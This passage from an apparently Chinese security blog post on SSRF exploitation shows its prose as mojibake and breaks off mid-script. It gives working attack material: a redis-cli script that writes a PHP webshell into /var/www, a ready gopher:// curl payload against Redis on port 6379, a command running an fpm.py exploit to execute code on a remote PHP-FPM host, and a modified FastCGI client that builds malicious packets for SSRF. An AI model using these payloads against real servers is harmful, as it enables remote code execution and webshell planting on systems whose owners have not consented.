<p>ç¨ç­‰ä¸€ä¸‹ï¼Œå°±å¯ä»¥æˆåŠŸåå¼¹shellã€‚</p>
<h4 id="è·å–-web-æœåŠ¡çš„-webshell">è·å– web æœåŠ¡çš„ webshell</h4>
<p>å½“ redis æƒé™ä¸é«˜æ—¶ï¼Œå¹¶ä¸”æœåŠ¡å™¨å¼€ç€ web æœåŠ¡ï¼Œåœ¨ redis æœ‰ web ç›®å½•å†™æƒé™æ—¶ï¼Œå¯ä»¥å°è¯•å¾€ web è·¯å¾„å†™ webshellã€‚</p>
<p>æ¨¡ä»¿ä¸Šé¢çš„shellè„šæœ¬æ¥å†™ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># shell2.php</span></span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> flushall</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dir /var/www/</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> <span class="built_in">set</span> webshell <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> save</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> quit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ³¨æ„ï¼šä¸€å®šè¦åœ¨$POSTå‰é¢åŠ ä¸Šè½¬ä¹‰ç¬¦\ï¼Œä¸ç„¶åœ¨æœ€åçš„æ–‡ä»¶é‡Œé¢$_POSTä¼šè¢«åæ‰ï¼ï¼ï¼ï¼ˆå› ä¸º$ç¬¦å·æ˜¯redisçš„ä¸€ç§è¯­æ³•ï¼‰</p>
</blockquote>
<p>æ‰§è¡Œshell2.phpï¼ŒåŒæ ·ä½¿ç”¨socatåœ¨4444ç«¯å£è½¬å‘ã€‚</p>
<p>æ•è·åˆ°çš„æ•°æ®å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*1\r</span><br><span class="line">$8\r</span><br><span class="line">flushall\r</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$3\r</span><br><span class="line">dir\r</span><br><span class="line">$8\r</span><br><span class="line">&#x2F;var&#x2F;www\r</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$10\r</span><br><span class="line">dbfilename\r</span><br><span class="line">$9\r</span><br><span class="line">shell.php\r</span><br><span class="line">*3\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$3\r</span><br><span class="line">web\r</span><br><span class="line">$18\r</span><br><span class="line">%3C%3Fphp%20phpinfo()%3B%3F%3E\r</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">save\r</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">quit\r</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å‚è€ƒjoychouå†™cronçš„è„šæœ¬è½¬æ¢ï¼Œpythonè½¬æ¢è„šæœ¬å¦‚ä¸‹:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f &#x3D; open(&#39;payload.txt&#39;, &#39;r&#39;)</span><br><span class="line">s &#x3D; &#39;&#39;</span><br><span class="line">for line in f.readlines():</span><br><span class="line">        line &#x3D; line.replace(r&quot;\r&quot;, &quot;%0d%0a&quot;)</span><br><span class="line">        line &#x3D; line.replace(&quot;\n&quot;, &#39;&#39;)</span><br><span class="line">        s &#x3D; s + line</span><br><span class="line">print s.replace(&quot;$&quot;, &quot;%24&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¦‚ä¸Šçš„å†™shellæ•°æ®æµç»è¿‡ç¼–ç å¦‚ä¸‹(æ³¨æ„phpä¸€å¥è¯ï¼Œç»è¿‡ä¸Šé¢è½¬æ¢è¿˜æ˜¯å°–æ‹¬å·ï¼Œä½†æ˜¯ä½¿ç”¨curlå‘é€çš„æ—¶å€™è¦æŠŠä¸€å¥è¯çš„ä¸¤ä¸ªå°–æ‹¬å·å’Œ<code>;</code>å’Œ<code>?</code>urlç¼–ç ï¼Œç„¶åä½¿ç”¨curlç›´æ¥å‘é€å¦‚ä¸‹ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥<code>$</code>è¿˜è¦ç¼–ç ï¼ŒçŸ¥é“çš„åŒå­¦è¯·å‘ŠçŸ¥ï¼Œè°¢è°¢ï¼‰:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@ca0y1h-centos ~]<span class="comment"># python tran2gopher.py socat2.log</span></span><br><span class="line">curl -v <span class="string">&quot;gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%248%0d%0a/var/www%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%249%0d%0ashell.php%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%243%0d%0aweb%0d%0a%2418%0d%0a%3C%3Fphp phpinfo()%3B%3F%3E%0d%0a*1%0d%0a%244%0d%0asave%0d%0aquit%0d%0a&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç„¶åä¸Šé¢çš„payloadåœ¨å­˜åœ¨ssrfçš„æ—¶å€™ï¼Œä½¿ç”¨å‘é€ä¹‹å‰è¦å†urlç¼–ç ä¸€æ¬¡ï¼Œå‘é€å³å¯å¾—åˆ°shellã€‚</p>
<h3 id="æ”»å‡»fastcgiï¼ˆTCPæ¨¡å¼ï¼‰">æ”»å‡»fastcgiï¼ˆTCPæ¨¡å¼ï¼‰</h3>
<blockquote>
<p>ç¯å¢ƒæ­å»ºè¯·è½¬åˆ°æ–‡ç« è«é—®çš„Appendix Bã€‚</p>
</blockquote>
<h4 id="ä»€ä¹ˆæ˜¯fastcgi">ä»€ä¹ˆæ˜¯fastcgi</h4>
<p>è¯·è½¬åˆ°æ–‡ç« æœ«å°¾çš„Appendix Aã€‚</p>
<p>fastcgié»˜è®¤ç›‘å¬ç«¯å£ä¸ºæœ¬æœºçš„9000ç«¯å£ï¼Œå¦‚æœå¯¹å¤–å¼€æ”¾çš„è¯å°±æœ‰å¯èƒ½é€ æˆä»»æ„ä»£ç æ‰§è¡Œï¼ˆå…·ä½“çœ‹pç‰›æ–‡ç« ä»‹ç»ï¼Œè®²çš„éå¸¸è¯¦ç»†äº†ï¼‰ã€‚ä½†æ˜¯ä¸€èˆ¬æƒ…å†µä¸ä¼šå¯¹å¤–å¼€æ”¾çš„ï¼Œæ‰€ä»¥æ­¤æ—¶éœ€è¦é…åˆgopher+ssrfåŠ ä»¥åˆ©ç”¨ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æ¡ä»¶: </span><br><span class="line">libcurlç‰ˆæœ¬&gt;&#x3D;7.45.0 (expä¸­å­˜åœ¨%00ï¼Œcurlç‰ˆæœ¬å°äº7.45.0ï¼Œgopherçš„%00ä¼šè¢«æˆªæ–­) </span><br><span class="line">PHP-FPMç›‘å¬ç«¯å£ </span><br><span class="line">PHP-FPMç‰ˆæœ¬ &gt;&#x3D; 5.3.3 </span><br><span class="line">çŸ¥é“æœåŠ¡å™¨ä¸Šä»»æ„ä¸€ä¸ªphpæ–‡ä»¶çš„ç»å¯¹è·¯å¾„</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="è¿œç¨‹æ”»å‡»php-fpm">è¿œç¨‹æ”»å‡»php-fpm</h4>
<p>è¿™ä¸ªåœºæ™¯æ˜¯æœ‰äº›ç®¡ç†å‘˜ä¸ºäº†æ–¹ä¾¿å§,æŠŠfastcgiç›‘å¬ç«¯å£è®¾ç½®ä¸º: <code>listen = 0.0.0.0:9000</code>è€Œä¸æ˜¯<code>listen = 127.0.0.1:9000</code> è¿™æ ·å­å¯ä»¥å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191210160010.png" alt=""></p>
<p>è¿™é‡Œåˆ©ç”¨pç‰›çš„exploitè„šæœ¬:</p>
<p><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">fpm.py</a></p>
<p>pythonå‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python fpm.py -c <span class="string">&#x27;&lt;?php echo `id`;exit;?&gt;&#x27;</span> 192.168.188.130 /var/www/html/index.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191210160340.png" alt=""></p>
<h4 id="SSRFæ”»å‡»æœ¬åœ°çš„php-fpm">SSRFæ”»å‡»æœ¬åœ°çš„php-fpm</h4>
<h5 id="åŸºæœ¬åŸç†">åŸºæœ¬åŸç†</h5>
<p>PHP-FPMå¼€æ”¾åœ¨å…¬ç½‘ä¸Šçš„æƒ…å†µæ˜¯å¾ˆå°‘çš„ï¼Œå¤§éƒ¨åˆ†æ—¶å€™éƒ½æ˜¯å¯åŠ¨åœ¨æœ¬åœ°å³ç›‘å¬127.0.0.1:9000åœ°å€çš„ã€‚</p>
<p>è™½ç„¶æˆ‘ä»¬æ²¡æœ‰åŠæ³•ç›´æ¥å¯¹PHP-FPMå‘èµ·æ”»å‡»ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç»“åˆå…¶ä»–æ¼æ´æ¥é—´æ¥åˆ©ç”¨ã€‚å¦‚æœç›®æ ‡ç«™ç‚¹å­˜åœ¨SSRFæ¼æ´ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å€ŸåŠ©SSRFæ¥æ”»å‡»æœ¬åœ°PHP-FPMæœåŠ¡ï¼Œè¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„æ•ˆæœã€‚</p>
<h5 id="åˆ©ç”¨æ–¹å¼-v2">åˆ©ç”¨æ–¹å¼</h5>
<p>ä¹‹å‰å·²ç»æåˆ°Gopheråè®®åœ¨SSRFåˆ©ç”¨ä¸­è¢«å¹¿æ³›è¿ç”¨ï¼Œå…¶URLæ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;gopher-path&gt;_åæ¥TCPæ•°æ®æµ</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡Gopheråè®®ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å‘é€TCPåè®®æµï¼Œå†è¿›è¡Œurlencodeç¼–ç æ¥æ„é€ SSRFæ”»å‡»ä»£ç ï¼Œå…¶ä¸­æ”»å‡»ä»£ç å°±æ˜¯æ¶æ„FastCGIåè®®æŠ¥æ–‡ã€‚</p>
<p>è¿™é‡Œæœ‰ä¸‰ç§æ–¹å¼æ¥ç”Ÿæˆæ¶æ„FastCGIåè®®æŠ¥æ–‡ï¼š</p>
<p>ä¸€ç§æ˜¯ä¸ç”¨ä¿®æ”¹Pç‰›çš„è„šæœ¬ï¼Œåœ¨æœ¬å³ä¸Šç›´æ¥å°†æµé‡æ‰“åˆ°æŸä¸€ä¸ªç«¯å£ï¼ˆæ¯”å¦‚9999ï¼‰ï¼ŒåŒæ—¶ç›‘å¬æ­¤ç«¯å£ï¼Œå†ä¿å­˜åˆ°æœ¬åœ°åè¿›è¡Œurlç¼–ç ï¼ˆæ­¤æ—¶è¦æ±‚æœ¬æœºä¸Šä¹Ÿæœ‰php-fpmæœåŠ¡ï¼‰ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æœ¬æœºç›‘å¬</span></span><br><span class="line">[root@ca01h ~] nc -lvvp 9999 &gt; exp.txt</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9999</span><br><span class="line">Ncat: Listening on 0.0.0.0:9999</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ¬æœºæ‰§è¡Œ</span></span><br><span class="line">[root@ca01h ~] python fpm.py 127.0.0.1 /usr/share/nginx/html/index.php -c <span class="string">&quot;&lt;?php echo `whoami`; exit();?&gt;&quot;</span> -p 9999</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿™æ ·exp.txtä¸­å°±æˆ‘ä»¬æ‰€éœ€è¦çš„æ¶æ„FastCGIåè®®æŠ¥æ–‡ï¼Œå†ç”¨ä¸‹é¢çš„å°è„šæœ¬å¯¹å…¶urlencodeå¾—åˆ°æœ€ç»ˆçš„Payloadï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;exp.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	pld = f.read()</span><br><span class="line"><span class="keyword">print</span> quote(pld)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>nginxè§£ç ä¸€æ¬¡,php-fpmè§£ç ä¸€æ¬¡ã€‚</p>
</blockquote>
<p>ç¬¬äºŒç§æ˜¯ä¿®æ”¹Pç‰›çš„è„šæœ¬ï¼Œè®©å…¶ç›´æ¥è¿”å›è¯·æ±‚çš„æŠ¥æ–‡å¹¶å°†å…¶urlencodeä¸€æ¬¡ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> six.moves.urllib <span class="keyword">import</span> parse <span class="keyword">as</span> urlparse</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        s = str(s, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, port, timeout, keepalive</span>):</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = dict()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, int(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            print(repr(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span>(<span class="params">self, fcgi_type, content, requestid</span>):</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span>(<span class="params">self, name, value</span>):</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">&#x27;version&#x27;</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">&#x27;type&#x27;</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span>(<span class="params">self, buffer</span>):</span></span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">&#x27;content&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;contentLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = int(record[<span class="string">&#x27;contentLength&#x27;</span>])</span><br><span class="line">                record[<span class="string">&#x27;content&#x27;</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;paddingLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">&#x27;paddingLength&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span>(<span class="params">self, nameValuePairs=&#123;&#125;, post=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.__connect():</span><br><span class="line">            print(<span class="string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b&quot;&quot;</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#self.sock.send(request)</span></span><br><span class="line">        <span class="comment">#self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND</span></span><br><span class="line">        <span class="comment">#self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27;</span></span><br><span class="line">        <span class="comment">#return self.__waitForResponse(requestId)</span></span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span>(<span class="params">self, requestId</span>):</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">&#x27;requestId&#x27;</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] += response[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">&#x27;response&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.format(self.host, self.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 